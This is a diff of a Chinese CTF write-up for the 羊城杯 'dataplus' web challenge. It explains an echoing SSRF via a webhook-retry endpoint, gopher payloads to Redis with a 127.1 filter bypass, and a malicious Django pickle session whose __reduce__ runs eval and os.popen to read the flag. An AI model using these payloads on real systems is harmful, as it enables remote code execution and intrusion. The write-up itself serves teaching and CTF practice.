@@ -7,7 +7,7 @@ tags: []
 draft: false
 ---
 
-# 羊城杯 web题 dataplus全面解析
+## 信息收集
 
 首先是信息收集
 GET / HTTP/1.1
@@ -28,6 +28,8 @@ curl --http1.1 -sSi https://example.com
 `Server: gunicorn` → Python WSGI 应用，大概率 Django/Flask。
 
 不过这个也不怎么重要
+
+### 探测健康检查接口
 
 然后可以通过api来探测这个项目的状态
 
@@ -58,6 +60,8 @@ done
 
 
 `task_queue` + `cache` 这两个组件名是重要线索：后面确实对应 Celery（Redis broker）和 Django session 缓存（Redis）。
+
+## 接口清单与 SSRF 入口
 
 通过首页、`/register/`、`/dashboard/` 的 HTML 和其中内联 JS 抽出来的接口：
 
@@ -106,6 +110,8 @@ fetch(`/tasks/${taskId}/retry-webhook/`, {
 `/tasks/<id>/webhook-logs/` 会把 `url / status_code / response_body / error` 原样返回 —— 这等于给了一个**带响应回显的 SSRF**
 
 
+## 注册账号与身份
+
 POST /register/ HTTP/1.1
 Content-Type: application/json
 
@@ -126,6 +132,8 @@ Set-Cookie: dp_session=0operlq2hjh79d0mi8liyq7xtt7jfn9z; HttpOnly; SameSite=Lax
 
 
 
+### 只能拿到普通分析员
+
 `/api/v1/profile/`：
 
 ```json
@@ -133,7 +141,9 @@ Set-Cookie: dp_session=0operlq2hjh79d0mi8liyq7xtt7jfn9z; HttpOnly; SameSite=Lax
  "api_token": "22f9f991...", "created_at": "2026-10-24T00:29:42.862006"}
 ```
 
- 这里就是普通的分析员，但是管理员接口需要 “platform_admin"。
+这里就是普通的分析员，但是管理员接口需要 “platform_admin"。
+
+## 创建任务与 SSRF
 
 创建任务：
 
@@ -153,7 +163,7 @@ POST /tasks/create/
 - `webhook_url` 为空时，`retry-webhook` 返回 400 `No webhook URL configured` ——    **必须先在创建任务时填一个 webhook_url**，这是后面 SSRF 的前置条件。
 
 
-2.1 功能与数据流
+### 功能与数据流
 
 `POST /tasks/<id>/retry-webhook/` 的 body 是 `{"url": "..."}`，后端拿这个 URL 去发通知，然后把结果写进 webhook 日志。返回示例：
 
@@ -168,6 +178,8 @@ POST /tasks/create/
 
 
 
+### 各种 URL 的过滤情况
+
 URL | 结果 | 结论 |
 |---|---|---|
 | `http://example.com/` | `HTTP Error 405: Method Not Allowed` | 外网可用，POST 请求 |
@@ -181,11 +193,13 @@ URL | 结果 | 结论 |
 | `file:///etc/passwd` | 400 | 非 http(s)/gopher 协议被拦 |
 | `dict://127.0.0.1:6379/INFO` | 400 | dict 被拦 |
 | `gopher://127.1:6379/_PING` | 200，返回 `+PONG` | **gopher 允许，且 127.1 绕过生效** |
-###  `Validation failed`核心含义：数据没通过“质检”
+### Validation failed 是什么
 
 几乎所有软件系统在接收用户输入或处理请求时，都会有一道“质检”工序，也就是**数据验证 (Validation)**。当提交的数据不符合规则时，系统就会拒绝处理，并返回 `Validation failed`，所以这个也是有一个黑名单出来的。
 
-gopher 的用法
+## 打 Redis
+
+### gopher 的用法
 
 gopher 的 payload 是 URL 路径里 `/_` 之后的部分，做 URL 编码：
 
@@ -208,7 +222,8 @@ gopher://127.1:6379/_PING%0d%0a
 这个就说明了这个redis正常回复我了
 
 
-3.0.3 RESP 是什么
+### RESP：Redis 的“说话格式”
+
 RESP 是 Redis 的“说话格式”，规则极简：先说这句话有几个词，然后每个词说“多长 + 内容
 
 *2\r\n          ← 我要说 2 个词
@@ -228,6 +243,8 @@ $3\r\nkey\r\n   ← 第 2 个词，3 个字节，内容 key
 | `*` | 数组/列表 | `*15` = 后面有 15 项 |
 | `-` | 报错 | `-ERR unknown command` |
 
+
+### 枚举库与键名
 
 redis本身是自带十六个数据库的，编号是从0到十五
 用SELECT n 就可以切换
@@ -307,6 +324,8 @@ GET :1:django.contrib.sessions.cachexxx
 
 
 
+### 取出 session 值
+
 接下来就是看看哪里有漏洞了
 
 因为它会返回一下session给我
@@ -322,33 +341,37 @@ GET :1:django.contrib.sessions.cache0operlq2hjh79d0mi8liyq7xtt7jfn9z
 {"user_id": 1, "role": "analyst"}
 也就是说 Django 的 session serializer 是 **PickleSerializer**（Django 3.1 之后默认 JSON；这里显然用了 pickle）。
 
-这里就是因为Django产生的反序列化漏洞了。### Django 是什么
+这里就是因为 Django 产生的反序列化漏洞了。
+
+## 从 session 到 RCE
+
+### Django 是什么
 
 Django 是一个 **Python Web 框架**，用来快速开发网站。它自带很多功能，其中就包括 **session 管理**——记住用户登录状态。
 
-### 为什么这个漏洞跟 Django 有关
+### 为什么跟 Django 有关
 
 Django 的 session 要存到 Redis，存之前得把 Python 字典转成字节，读出来再转回字典。Django 的 cache session 后端选择了 **`pickle`** 来做这件事：
 
-python
-
+```python
 pickle.dumps(session_dict)   # 存：字典 → 字节
 pickle.loads(redis_value)    # 读：字节 → 字典
+```
 
 问题在于：**`pickle.loads` 在还原字节时，可以触发任意函数调用**。正常字节还原成字典没问题；恶意字节里写了“调用 eval 执行命令”，`pickle.loads` 也会照做。
 
 ### 所以漏洞链是
 
-text
-
+```text
 Django 用 cache session 后端
   → session 存 Redis
   → 读写用 pickle
   → 攻击者通过 SSRF 往 Redis 写恶意 pickle
   → Django 读 session 时自动 pickle.loads
   → 触发 RCE
+```
 
-### 伪造 session（以及 key 长度的坑）
+### 伪造 session
 
 
 
@@ -379,65 +402,67 @@ EXPIRE :1:django.contrib.sessions.cache<our_key> 900
 最后就是来到重点：
 
 
-session反序列化rce
+## 序列化格式与 pickle
 
-#### 6.0.2 Python 常见序列化格式
->
-> | 格式 | 能表达什么 | 安全性 |
-> |---|---|---|
-> | `json` | 只有 dict/list/str/int/float/bool/null | 安全（纯数据） |
-> | `pickle` | **任意 Python 对象**（含“如何重建”的指令） | 危险：不可信数据 = RCE |
-> | `marshal` | Python 内部字节码结构 | 不可信数据也不安全 |
-> | `yaml.load`（非 safe_load） | 任意 Python 对象 | 危险 |
-> | `msgpack` / `protobuf` | 纯数据结构 | 相对安全 |
+### Python 常见序列化格式
 
-
-
-> ```
-> \x80\x02  \x80\x03  \x80\x04  \x80\x05   ← 二进制 pickle（协议 2~5）
-> gASV...  gAJ...                          ← base64 后的 pickle 常见开头
-> ```
+| 格式 | 能表达什么 | 安全性 |
+|---|---|---|
+| `json` | 只有 dict/list/str/int/float/bool/null | 安全（纯数据） |
+| `pickle` | **任意 Python 对象**（含“如何重建”的指令） | 危险：不可信数据 = RCE |
+| `marshal` | Python 内部字节码结构 | 不可信数据也不安全 |
+| `yaml.load`（非 safe_load） | 任意 Python 对象 | 危险 |
+| `msgpack` / `protobuf` | 纯数据结构 | 相对安全 |
 
 
-#### 6.0.3 pickle 为什么能执行代码
->
-> pickle 不是“存数据”，而是**存一套“怎么把对象造出来”的指令**（一种栈式虚拟机，有 GLOBAL / REDUCE 等 opcode）。
->
-> 其中最关键的是 `__reduce__`：
->
-> ```python
-> class E:
->     def __reduce__(self):
->         return (callable, args)      # 反序列化时执行 callable(*args)
-> ```
->
-> 也就是说：**你在 `__reduce__` 里写什么函数，服务端 `pickle.loads()` 时就会调用什么函数。**
->
-> 最小验证（本地就能跑）：
->
-> ```python
-> import pickle
->
-> class E:
->     def __reduce__(self):
->         return (eval, ("__import__('os').popen('id').read()",))
->
-> p = pickle.dumps(E(), protocol=4)
-> print(pickle.loads(p))      # 会执行命令并打印结果
-> ```
->
-> 对应到底层 opcode，大致是：
->
-> ```
-> \x80\x04                 PROTO 4
-> c builtins\neval\n       GLOBAL：加载 eval 函数
-> ...                      (MARK / 构造参数元组)
-> R                        REDUCE：调用 eval(args)
-> .                        STOP
-> ```
->
-> 所以“反序列化漏洞”不是数据被篡改，而是**数据里带了一条“请调用这个函数”的指令**。
 
+```
+\x80\x02  \x80\x03  \x80\x04  \x80\x05   ← 二进制 pickle（协议 2~5）
+gASV...  gAJ...                          ← base64 后的 pickle 常见开头
+```
+
+
+### pickle 为什么能执行代码
+
+pickle 不是“存数据”，而是**存一套“怎么把对象造出来”的指令**（一种栈式虚拟机，有 GLOBAL / REDUCE 等 opcode）。
+
+其中最关键的是 `__reduce__`：
+
+```python
+class E:
+    def __reduce__(self):
+        return (callable, args)      # 反序列化时执行 callable(*args)
+```
+
+也就是说：**你在 `__reduce__` 里写什么函数，服务端 `pickle.loads()` 时就会调用什么函数。**
+
+最小验证（本地就能跑）：
+
+```python
+import pickle
+
+class E:
+    def __reduce__(self):
+        return (eval, ("__import__('os').popen('id').read()",))
+
+p = pickle.dumps(E(), protocol=4)
+print(pickle.loads(p))      # 会执行命令并打印结果
+```
+
+对应到底层 opcode，大致是：
+
+```
+\x80\x04                 PROTO 4
+c builtins\neval\n       GLOBAL：加载 eval 函数
+...                      (MARK / 构造参数元组)
+R                        REDUCE：调用 eval(args)
+.                        STOP
+```
+
+所以“反序列化漏洞”不是数据被篡改，而是**数据里带了一条“请调用这个函数”的指令**。
+
+
+### 构造恶意 pickle 并读 flag
 
 前面两个事实拼起来就是答案：
 
@@ -445,18 +470,21 @@ session反序列化rce
 2. Django 的 cache session 后端**把 session 当成 pickle 反序列化**
 
 
- 于是我们可以伪造一个cookie，然后这个cookie的键值是一个恶意的payload
- 后面我们请求这个/dashboard/这个api路径的时候把session的值改为我们伪造的session值，里面就会执行我们的反序话我们的payload，执行我们恶意的代码。
+于是我们可以伪造一个cookie，然后这个cookie的键值是一个恶意的payload
+后面我们请求这个/dashboard/这个api路径的时候把session的值改为我们伪造的session值，里面就会执行我们的反序话我们的payload，执行我们恶意的代码。
 
 
+```python
 CMD = ("__import__('redis').Redis().set('pwn2',"
          "__import__('os').popen('/readflag').read())")
 
-  class E:
-      def __reduce__(self):
-          return (eval, (CMD,))
+class E:
+    def __reduce__(self):
+        return (eval, (CMD,))
 
-  payload = pickle.dumps(E(), protocol=4)
+payload = pickle.dumps(E(), protocol=4)
+```
+
 这个就是恶意的payload放在伪造的cookie所对应的值，当我们用伪装的session的值去请求的时候就会执行这个命令，但是
 
 响应 **500**，但这不是失败 —— 500 是后面 session 类型不对导致的，**反序列化已经执行完了**。这个时候这个flag值已经写入了pwn2键值中。
